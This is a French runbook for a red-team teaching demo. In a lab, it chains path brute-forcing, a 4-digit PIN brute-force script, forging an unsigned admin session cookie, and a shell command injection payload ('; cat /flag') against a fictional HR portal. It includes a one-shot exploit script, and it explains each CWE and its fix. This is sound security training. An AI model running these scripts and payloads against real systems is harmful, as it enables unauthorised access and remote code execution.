# Runbook — démo live (Master Class TCC IPNET · Red Team, phase offensive)

Commandes **complètes**, rien de caché : outils standard (`curl`, `python3`, `base64`) et une
explication de chaque terme. Chaîne en 4 maillons sur un portail RH fictif (**AgoRH**). À la fin, un
[glossaire](#glossaire).

> ⚠️ Cadre : environnement 100 % fictif et autorisé. Hors d'un lab qui vous appartient, ces
> commandes sont illégales.

Le PIN d'alice et le flag **changent à chaque redéploiement**. Les valeurs ci-dessous viennent
d'une instance de test.

---

## 0. Préparer la scène

```bash
cd masterclass_ipnet/demo
bash setup.sh                           # déploie la cible (AgoRH) + la machine d'attaque
docker exec -it rtm1-demo-attacker bash # on joue toute la démo depuis l'attaquant
T=http://172.30.40.10:8080              # adresse du portail (pour ne pas la retaper)
curl -s $T/ | head -3                   # le portail répond
```

> **La cible** : un seul service web, « AgoRH – portail RH interne ». Le fichier `/flag` est sur le
> serveur mais **aucune page ne le sert** : il faudra exécuter une commande sur la machine
> (maillon 4) pour le lire.

---

## Maillon 1 — Reconnaissance : brute-force de chemins (content discovery)

Le `robots.txt` est discret cette fois (il ne cite que `/admin`) :

```bash
curl -s $T/robots.txt
# User-agent: *
# Disallow: /admin/
```

> **Terme — content discovery / forced browsing** : beaucoup de fichiers existent sur un serveur
> sans qu'aucun lien n'y mène (sauvegardes, pages d'admin, anciens scripts). On les trouve en
> **testant une liste de noms probables** (une *wordlist*). Les outils dédiés : `gobuster`, `ffuf`,
> `dirb`, `feroxbuster`. Ici, on le fait à la main en Python avec une mini-wordlist.

```bash
python3 - <<'PY'
import urllib.request as u
T = "http://172.30.40.10:8080"
dossiers = ["backup", "backups", "bak", "old", "archive", "tmp"]
fichiers = ["notes.txt", "backup.txt", "notes", "users.txt", "dump.sql", "config.txt"]
for d in dossiers:
    for f in fichiers:
        chemin = f"/{d}/{f}"
        try:
            u.urlopen(T + chemin, timeout=3)   # 200 -> pas d'exception
            print("TROUVÉ 200 :", chemin)
        except Exception:
            pass                               # 404 -> on ignore
PY
# TROUVÉ 200 : /backup/notes.txt
```

> **Comment ça marche** : `urlopen` renvoie la page si elle existe (HTTP 200), et **lève une
> exception** sinon (404). On ne garde que les chemins qui répondent. Une vraie wordlist en contient
> des milliers ; ici 6×6 = 36 essais suffisent.

On lit le fichier découvert :

```bash
curl -s $T/backup/notes.txt
# - Les PIN temporaires sont a 4 chiffres (0000-9999).
# - Compte de test encore actif : alice
# - Outil admin de diagnostic reseau : /admin/diag?host=<hote>
```

> **Ce qu'on apprend** : un **compte** (`alice`), une **politique de mot de passe faible** (PIN à
> 4 chiffres) et un **outil d'admin** (`/admin/diag`). Un fichier de sauvegarde oublié = fuite
> d'info classique. CWE-200.

---

## Maillon 2 — Accès : trouver le PIN en Python (brute-force)

> **Terme — brute-force** : essayer toutes les valeurs possibles. PIN à 4 chiffres = **10 000**
> combinaisons. Sans **limitation de tentatives** (verrouillage, délai), c'est l'affaire d'une
> seconde.

```bash
PIN=$(python3 - <<'PY'
import urllib.request as u, urllib.parse as p, urllib.error as e
T = "http://172.30.40.10:8080"
for n in range(10000):
    pin = "%04d" % n                                   # 0000, 0001, ... 9999
    data = p.urlencode({"user": "alice", "pin": pin}).encode()
    try:
        u.urlopen(T + "/login", data)                  # 200 -> trouvé
        print(pin)
        break
    except e.HTTPError:                                # 401 -> mauvais PIN
        pass
PY
)
echo "PIN trouvé = $PIN"
# PIN trouvé = 2045
```

> **Comment ça marche** : on **POST** chaque PIN à `/login`. Le serveur répond **200** si c'est bon
> (`urlopen` réussit), **401** sinon (`HTTPError`). On s'arrête au premier succès et on **stocke le
> PIN** dans la variable `$PIN` pour la suite.
>
> **Deux failles** : mot de passe trop faible (CWE-521) **et** absence d'anti-bruteforce (CWE-307).
> Correctif : mots de passe longs, verrouillage/temporisation, 2FA.

---

## Maillon 3 — Élévation de privilèges : un cookie non signé

Récupérons le cookie renvoyé après connexion (avec le PIN trouvé) :

```bash
curl -si -X POST $T/login --data "user=alice&pin=$PIN" | grep -i set-cookie
# Set-Cookie: session=eyJ1c2VyIjogImFsaWNlIiwgInJvbGUiOiAidXNlciJ9; Path=/
```

Décodons-le :

```bash
echo 'eyJ1c2VyIjogImFsaWNlIiwgInJvbGUiOiAidXNlciJ9' | base64 -d
# {"user": "alice", "role": "user"}
```

> **La faille** : ce cookie est juste du **base64(JSON)**, **sans signature**. `base64` est un
> **encodage** (réversible par tous), pas du chiffrement : on peut le lire **et le réécrire**. Le
> serveur fait confiance au champ `role` qu'il contient.

On forge un cookie `role=admin` :

```bash
FORGE=$(python3 -c 'import base64,json;print(base64.urlsafe_b64encode(json.dumps({"user":"alice","role":"admin"}).encode()).decode())')
echo "$FORGE"
# eyJ1c2VyIjogImFsaWNlIiwgInJvbGUiOiAiYWRtaW4ifQ==
```

> **Correctif** : signer la session côté serveur (cookie signé/chiffré, ou identifiant opaque
> pointant vers une session serveur). **Ne jamais** déduire un rôle d'une donnée fournie par le
> client. CWE-565 / CWE-639 (IDOR).

---

## Maillon 4 — Exécution : injection de commande → flag

> **Terme — injection de commande** : quand l'entrée utilisateur est insérée dans une commande
> **shell**, les caractères `;` `|` `&&` `$(...)` permettent d'**enchaîner** ou de **substituer**
> des commandes. Ici `/admin/diag` fait `ping -c1 <host>` ; on détourne `<host>`.

```bash
curl -s -G $T/admin/diag \
  --data-urlencode 'host=127.0.0.1; cat /flag' \
  -H "Cookie: session=$FORGE"
# 1 packets transmitted, 1 received, 0% packet loss
# NCTF{agorh_....}
```

> **Décomposition du `host`** : `127.0.0.1` fait un ping anodin, puis `;` **termine** cette commande
> et en démarre une autre : `cat /flag` lit le fichier du flag, qu'aucune page web ne sert.
>
> **Terme — RCE (Remote Code Execution)** : lire le flag est l'exemple visible ; on exécute en
> réalité **n'importe quelle commande** sur le serveur — c'est le contrôle total.
>
> **Correctif** : jamais de shell avec entrée utilisateur ; arguments en **liste** sans shell
> (`subprocess.run(["ping","-c1",host])`), ou liste blanche stricte. CWE-78.

---

## Butin

Quatre failles classiques enchaînées → **compromission complète** du serveur : découverte (brute
force de chemins), accès (brute force du PIN), élévation (cookie forgé), exécution (RCE) et lecture
du flag.

### Variante « tout en un » (secours si le temps manque)

```bash
T=http://172.30.40.10:8080
PIN=$(python3 - <<'PY'
import urllib.request as u, urllib.parse as p, urllib.error as e
T="http://172.30.40.10:8080"
for n in range(10000):
    d=p.urlencode({"user":"alice","pin":"%04d"%n}).encode()
    try: u.urlopen(T+"/login",d); print("%04d"%n); break
    except e.HTTPError: pass
PY
)
FORGE=$(python3 -c 'import base64,json;print(base64.urlsafe_b64encode(json.dumps({"user":"alice","role":"admin"}).encode()).decode())')
curl -s -G $T/admin/diag --data-urlencode 'host=127.0.0.1; cat /flag' -H "Cookie: session=$FORGE" | tail -1
```

---

## Réinitialiser / démonter / défense en direct

- Nouvelle instance (nouveau PIN, nouveau flag) : `cd masterclass_ipnet/demo && bash setup.sh`
- **Montrer la défense** : dans `challenge/app/server.py`, remplacer la ligne vulnérable
  `subprocess.run("ping -c 1 -W 1 " + host, shell=True, …)` par
  `subprocess.run(["ping","-c","1","-W","1",host], …)`, redéployer, refaire le maillon 4 → le `;`
  n'est plus interprété, l'injection échoue.
- Tout arrêter : `cd masterclass_ipnet/demo && bash teardown.sh`

---

## Glossaire

| Terme | En une phrase |
|---|---|
| **Content discovery** | Brute-forcer des chemins pour trouver des fichiers non liés (gobuster, ffuf). |
| **Wordlist** | Liste de noms probables testés pendant le brute-force. |
| **robots.txt** | Chemins « à ne pas indexer » ; révèle parfois des dossiers, ne protège rien. |
| **Brute-force** | Essayer toutes les combinaisons ; un PIN court sans limite tombe en secondes. |
| **Politique de MDP faible** | Mots de passe courts/simples autorisés (ici PIN 4 chiffres). |
| **Cookie / session** | Jeton côté client ; s'il n'est pas signé, il est falsifiable. |
| **base64** | Encodage réversible par tous — pas du chiffrement. |
| **Cookie faible / IDOR** | Obtenir des droits en manipulant une valeur contrôlée par le client. |
| **Injection de commande** | L'entrée atteint un shell ; `;` `|` `&&` `$()` enchaînent des commandes. |
| **RCE** | Exécution de code à distance : ici lire `/flag`, en fait l'accès total au serveur. |
